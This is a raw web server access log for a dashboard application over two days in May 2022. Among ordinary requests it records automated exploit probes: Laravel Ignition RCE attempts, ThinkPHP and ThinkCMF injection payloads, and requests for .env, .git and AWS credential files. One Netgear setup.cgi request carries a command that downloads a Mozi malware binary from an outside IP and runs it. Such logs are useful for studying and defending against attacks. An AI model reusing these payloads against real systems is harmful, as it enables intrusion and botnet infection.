[24/May/2022 06:04:24] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[24/May/2022 06:04:24] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[24/May/2022 06:04:24] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
Not Found: /sockjs-node
[24/May/2022 06:04:26] "GET /sockjs-node HTTP/1.0" 404 2189
[24/May/2022 06:04:27] "GET /public/favicon.ico HTTP/1.0" 200 22382
[24/May/2022 06:04:28] "GET /api/authentication/getUser HTTP/1.0" 200 84
[24/May/2022 06:04:28] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.0" 200 20322
[24/May/2022 06:04:28] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.0" 200 66644
[24/May/2022 06:04:28] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[24/May/2022 06:04:28] "GET /public/assets/layout/images/logo-light.png HTTP/1.0" 200 2725
[24/May/2022 06:04:28] "GET /public/assets/layout/images/profile-image.png HTTP/1.0" 200 18199
[24/May/2022 06:04:29] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.0" 200 18199
[24/May/2022 06:04:29] "POST /api/future_spot_summary/read HTTP/1.0" 200 32925
[24/May/2022 06:08:54] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 06:17:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[24/May/2022 06:55:30] "GET / HTTP/1.0" 302 0
Not Found: /.env
[24/May/2022 07:16:28] "GET /.env HTTP/1.0" 404 2160
[24/May/2022 07:16:28] "POST / HTTP/1.0" 302 0
Not Found: /actuator/gateway/routes
[24/May/2022 07:42:26] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
[24/May/2022 11:02:17] "HEAD / HTTP/1.0" 302 0
[24/May/2022 11:02:17] "HEAD /public/index.html HTTP/1.0" 200 2139
[24/May/2022 11:02:22] "GET / HTTP/1.0" 302 0
[24/May/2022 11:02:23] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 11:02:23] "GET / HTTP/1.0" 302 0
[24/May/2022 11:33:24] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:00] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:01] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:01] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:02] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:04] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 11:46:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[24/May/2022 12:29:43] "GET / HTTP/1.0" 302 0
Not Found: /editBlackAndWhiteList
[24/May/2022 13:43:46] "POST /editBlackAndWhiteList HTTP/1.0" 404 2212
[24/May/2022 13:45:45] "GET / HTTP/1.0" 302 0
[24/May/2022 13:49:35] "HEAD / HTTP/1.0" 302 0
[24/May/2022 13:49:36] "HEAD /public/index.html HTTP/1.0" 200 2139
[24/May/2022 13:49:41] "GET / HTTP/1.0" 302 0
[24/May/2022 13:49:42] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 14:21:21] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[24/May/2022 14:21:21] "POST /HNAP1/ HTTP/1.0" 404 2167
[24/May/2022 14:40:59] "GET / HTTP/1.0" 302 0
[24/May/2022 14:51:45] "GET / HTTP/1.0" 302 0
[24/May/2022 14:51:45] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 15:09:26] "GET / HTTP/1.0" 302 0
[24/May/2022 15:09:26] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[24/May/2022 16:17:16] "GET /.env HTTP/1.0" 404 2160
[24/May/2022 16:28:17] "GET / HTTP/1.0" 302 0
[24/May/2022 16:28:17] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 16:29:55] "GET / HTTP/1.0" 302 0
[24/May/2022 16:29:56] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /GponForm/diag_Form
[24/May/2022 16:36:02] "POST /GponForm/diag_Form?images/ HTTP/1.0" 404 2208
[24/May/2022 16:37:02] "GET / HTTP/1.0" 302 0
[24/May/2022 16:37:04] "GET / HTTP/1.0" 302 0
[24/May/2022 16:37:05] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.git/config
[24/May/2022 16:48:32] "GET /.git/config HTTP/1.0" 404 2181
Not Found: /.aws/credentials
[24/May/2022 17:09:01] "GET /.aws/credentials HTTP/1.0" 404 2196
[24/May/2022 17:15:15] "GET / HTTP/1.0" 302 0
[24/May/2022 17:49:44] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 304 0
[24/May/2022 17:49:44] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 304 0
[24/May/2022 17:49:44] "GET /public/static/js/bundle.js HTTP/1.0" 304 0
[24/May/2022 17:49:44] "GET /public/static/js/0.chunk.js HTTP/1.0" 304 0
[24/May/2022 17:49:44] "GET /public/static/js/main.chunk.js HTTP/1.0" 304 0
Not Found: /sockjs-node
[24/May/2022 17:49:46] "GET /sockjs-node HTTP/1.0" 404 2189
[24/May/2022 17:49:46] "GET /public/favicon.ico HTTP/1.0" 304 0
[24/May/2022 17:49:46] "GET /api/authentication/getUser HTTP/1.0" 200 84
[24/May/2022 17:49:47] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.0" 200 20322
[24/May/2022 17:49:47] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.0" 200 66644
[24/May/2022 17:49:47] "GET /public/assets/layout/images/profile-image.png HTTP/1.0" 200 18199
[24/May/2022 17:49:47] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.0" 200 18199
[24/May/2022 17:49:47] "GET /public/assets/layout/images/logo-light.png HTTP/1.0" 200 2725
[24/May/2022 17:49:47] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[24/May/2022 17:49:47] "POST /api/future_spot_summary/read HTTP/1.0" 200 32925
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 17:58:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[24/May/2022 18:02:49] "GET / HTTP/1.0" 302 0
[24/May/2022 18:04:31] "GET / HTTP/1.0" 302 0
[24/May/2022 18:04:31] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 19:11:54] "GET / HTTP/1.0" 302 0
Not Found: /.env
[24/May/2022 19:32:03] "GET /.env HTTP/1.0" 404 2160
[24/May/2022 19:32:04] "POST / HTTP/1.0" 302 0
[24/May/2022 19:36:07] "GET / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[24/May/2022 21:43:31] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[24/May/2022 21:50:07] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[24/May/2022 21:55:03] "GET / HTTP/1.0" 302 0
[24/May/2022 21:55:04] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[24/May/2022 22:20:43] "GET /.env HTTP/1.0" 404 2160
Not Found: /solr/admin/info/system
[24/May/2022 22:20:56] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
Not Found: /index.php
[24/May/2022 22:53:13] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[24/May/2022 22:53:49] "GET / HTTP/1.0" 302 0
[24/May/2022 22:53:49] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 23:21:37] "GET / HTTP/1.0" 302 0
[24/May/2022 23:55:43] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[24/May/2022 23:55:47] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 00:31:44] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[25/May/2022 00:31:45] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /console/
[25/May/2022 00:47:22] "GET /console/ HTTP/1.0" 404 2172
Not Found: /Autodiscover/Autodiscover.xml
[25/May/2022 01:31:39] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /_ignition/execute-solution
[25/May/2022 01:43:05] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:56] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:45:59] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:46:00] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:46:01] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:46:02] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:46:02] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 01:46:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[25/May/2022 02:32:48] "GET / HTTP/1.0" 302 0
[25/May/2022 02:32:49] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 02:47:40] "GET / HTTP/1.0" 302 0
[25/May/2022 03:11:52] "GET / HTTP/1.0" 302 0
[25/May/2022 03:11:52] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /HNAP1/
[25/May/2022 03:11:52] "GET /HNAP1/ HTTP/1.0" 404 2166
[25/May/2022 03:30:34] "GET / HTTP/1.0" 302 0
Not Found: /setup.cgi
[25/May/2022 03:42:24] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.107.1.21:41105/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2347
[25/May/2022 03:46:02] "GET / HTTP/1.0" 302 0
[25/May/2022 04:00:25] "GET / HTTP/1.0" 302 0
[25/May/2022 04:00:26] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /cgi-bin/index2.asp
[25/May/2022 04:06:42] "POST /cgi-bin/index2.asp HTTP/1.0" 404 2203
Not Found: /actuator/gateway/routes
[25/May/2022 04:14:05] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
[25/May/2022 04:42:08] "GET / HTTP/1.0" 302 0
[25/May/2022 05:43:05] "GET / HTTP/1.0" 302 0
[25/May/2022 06:45:34] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 07:57:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[25/May/2022 08:50:32] "GET / HTTP/1.0" 302 0
[25/May/2022 08:50:32] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 08:56:10] "GET / HTTP/1.0" 302 0
[25/May/2022 08:56:11] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 09:23:46] "GET / HTTP/1.0" 302 0
[25/May/2022 09:23:46] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 09:51:55] "GET / HTTP/1.0" 302 0
[25/May/2022 09:56:39] "GET / HTTP/1.0" 302 0
[25/May/2022 09:56:39] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /ncsi.txt
[25/May/2022 09:56:42] "GET /ncsi.txt HTTP/1.0" 404 2176
Not Found: /HNAP1/
[25/May/2022 09:56:43] "GET /HNAP1/ HTTP/1.0" 404 2166
Not Found: /hudson
[25/May/2022 10:20:07] "GET /hudson HTTP/1.0" 404 2166
[25/May/2022 10:42:52] "GET / HTTP/1.0" 302 0
[25/May/2022 10:42:52] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[25/May/2022 10:51:11] "GET /.env HTTP/1.0" 404 2160
[25/May/2022 10:51:11] "POST / HTTP/1.0" 302 0
[25/May/2022 11:06:13] "GET / HTTP/1.0" 302 0
Not Found: /.git/HEAD
[25/May/2022 11:26:38] "GET /.git/HEAD HTTP/1.0" 404 2175
[25/May/2022 11:31:50] "GET / HTTP/1.0" 302 0
[25/May/2022 12:19:12] "GET / HTTP/1.0" 302 0
[25/May/2022 12:19:13] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 12:39:18] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 13:47:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[25/May/2022 14:38:05] "GET / HTTP/1.0" 302 0
[25/May/2022 14:38:05] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 15:30:08] "GET / HTTP/1.0" 302 0
Not Found: /.git/HEAD
[25/May/2022 15:31:07] "GET /.git/HEAD HTTP/1.0" 404 2175
[25/May/2022 16:38:01] "GET / HTTP/1.0" 302 0
[25/May/2022 18:15:33] "GET / HTTP/1.0" 302 0
[25/May/2022 18:15:34] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /showLogin.cc
[25/May/2022 18:15:34] "GET /showLogin.cc HTTP/1.0" 404 2184
Not Found: /.env
[25/May/2022 18:16:09] "GET /.env HTTP/1.0" 404 2160
[25/May/2022 18:16:10] "POST / HTTP/1.0" 302 0
[25/May/2022 18:21:55] "GET / HTTP/1.0" 302 0
Not Found: /.env
[25/May/2022 18:39:48] "GET /.env HTTP/1.0" 404 2160
Not Found: /vendor/.env
[25/May/2022 18:39:48] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /storage/.env
[25/May/2022 18:39:48] "GET /storage/.env HTTP/1.0" 404 2184
[25/May/2022 18:39:49] "GET /public/.env HTTP/1.0" 404 1634
[25/May/2022 18:39:49] "POST / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[25/May/2022 19:06:54] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[25/May/2022 19:15:34] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
Not Found: /solr/admin/info/system
[25/May/2022 20:00:18] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[25/May/2022 20:07:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[25/May/2022 20:10:12] "GET / HTTP/1.0" 302 0
Not Found: /index.php
[25/May/2022 20:46:07] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[25/May/2022 20:53:03] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[25/May/2022 20:53:05] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 21:11:25] "GET / HTTP/1.0" 302 0
[25/May/2022 21:11:25] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 21:32:31] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[25/May/2022 21:32:43] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 22:01:55] "GET / HTTP/1.0" 302 0
Not Found: /console/
[25/May/2022 22:04:45] "GET /console/ HTTP/1.0" 404 2172
[25/May/2022 22:42:20] "HEAD / HTTP/1.0" 302 0
Not Found: /system_api.php
[25/May/2022 22:42:22] "GET /system_api.php HTTP/1.0" 404 2190
Not Found: /c/version.js
[25/May/2022 22:42:24] "GET /c/version.js HTTP/1.0" 404 2184
Not Found: /streaming/clients_live.php
[25/May/2022 22:42:26] "GET /streaming/clients_live.php HTTP/1.0" 404 2226
Not Found: /stalker_portal/c/version.js
[25/May/2022 22:42:28] "GET /stalker_portal/c/version.js HTTP/1.0" 404 2229
Not Found: /stream/live.php
[25/May/2022 22:42:30] "GET /stream/live.php HTTP/1.0" 404 2193
Not Found: /flu/403.html
[25/May/2022 22:42:32] "GET /flu/403.html HTTP/1.0" 404 2184
[25/May/2022 22:42:34] "GET / HTTP/1.0" 302 0
[25/May/2022 22:42:34] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /editBlackAndWhiteList
[25/May/2022 22:56:37] "POST /editBlackAndWhiteList HTTP/1.0" 404 2212
Not Found: /Autodiscover/Autodiscover.xml
